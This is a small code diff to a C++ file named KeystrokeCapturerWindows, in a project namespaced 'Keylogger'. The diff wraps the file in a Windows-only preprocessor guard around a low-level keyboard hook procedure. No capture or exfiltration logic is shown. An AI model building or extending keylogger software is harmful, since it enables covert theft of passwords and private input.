@@ -1,3 +1,5 @@
+#ifdef _WIN32
+
 #include "KeystrokeCapturerWindows.h"
 
 namespace Keylogger {
@@ -62,3 +64,5 @@ LRESULT CALLBACK KeystrokeCapturerWindows::LowLevelKeyboardProc(int nCode, WPARA
 }
 
 }
+
+#endif // defined(_WIN32)
